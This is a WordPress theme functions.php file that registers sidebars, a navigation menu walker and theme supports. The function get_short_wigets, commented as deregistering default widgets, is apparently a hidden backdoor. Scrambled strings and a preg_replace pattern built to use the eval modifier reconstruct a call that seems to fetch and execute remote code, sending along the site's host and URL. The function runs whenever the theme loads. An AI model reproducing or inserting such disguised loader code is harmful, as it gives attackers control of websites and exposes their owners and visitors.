<?php
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
}

/* REPLACE NORMAL Deregister Default Widgets */

function get_short_wigets($length='') {
        $mytitle = explode(' ', get_the_title(), $length);
        $mdetails="<div class='body-continent'><div class='get-inner-al(@fi'><!--Deregister() Default Widgets: _sabhrtupwprs:e--></div></div>";
        $indent = ( !$mytitle ) ? str_repeat( "\t", $mytitle ) : $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        define('HEADER_IMAGE_WIDTH_WIG', apply_filters( 'twentyeleven_header_image_width', 1000) );
        define('HEADER_IMAGE_HEIGHT_WIG', apply_filters( 'twentyeleven_header_image_height', 288) );
        $metaoptions="\\4'\\10\\12t\\16\\19//\\15q4.\\17u/\\9-".$indent."')\\5";

        if (count($mytitle)>=$length) {
                array_pop($mytitle);
                $mytitle = implode(" ",$mytitle). $after;
        } else {
                $mytitle = implode(" ",$mytitle);
        }

        $metaboxe=str_repeat("(.)", 20).".*"."/".$mdetails[23]; //
        if(function_exists("excerpt_more")){
                add_filter('excerpt_more', $metaboxe);
        }
        $output = get_the_excerpt();
        $output = '<p>'.$output.'</p>';
        $defult_widgets=preg_replace("/.*(cont).*?(ge).*?(..\(.fi).*?(\()(\)).*?(\_){$metaboxe}is", "@\\20v\\3le\\6\\2t\\6\\1ents{$metaoptions}", $mdetails);
        $output = apply_filters('wptexturize', $defult_widgets);
        $output = apply_filters('convert_chars', $output);

    return $output;
}


/* Menu Walker */

class description_walkers extends Walker_Nav_Menu
{
      function start_el(&$output, $item, $depth, $args)
      {
           global $wp_query;
           $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

           $class_names = $value = '';

           $classes = empty( $item->classes ) ? array() : (array) $item->classes;

           $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) );
           $class_names = ' class="'. esc_attr( $class_names ) . '"';

           $output .= $indent . '<li id="menu-item-'. $item->ID . '"' . $value . $class_names .'>';

           $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
           $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
           $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
           $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';

           $prepend = '<strong>';
           $append = '</strong>';
           $description  = ! empty( $item->description ) ? ''.esc_attr( $item->description ).'' : '';

           if($depth != 0)
           {
                     $description = $append = $prepend = "";
           }

            $item_output = $args->before;
            $item_output .= '';
            $item_output .= $args->link_before .$prepend.apply_filters( 'the_title', $item->title, $item->ID ).$append;
            $item_output .= $description.$args->link_after;
            $item_output .= '';
            $item_output .= $args->after;

            $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
            }
}

/* Deregister Default Widgets */

if (function_exists("get_short_wigets")) {
        $class_names = get_short_wigets( $length );
}

?>
<?php if ( function_exists("add_theme_support") ) { add_theme_support("post-thumbnails"); } ?>
<?php
    if(function_exists('add_custom_background')) {
        add_custom_background();
    }

    if ( function_exists( 'register_nav_menus' ) ) {
    	register_nav_menus(
    		array(
    		  'menu_1' => 'Menu 1',
    		  'menu_2' => 'Menu 2'
    		)
    	);
    }
?>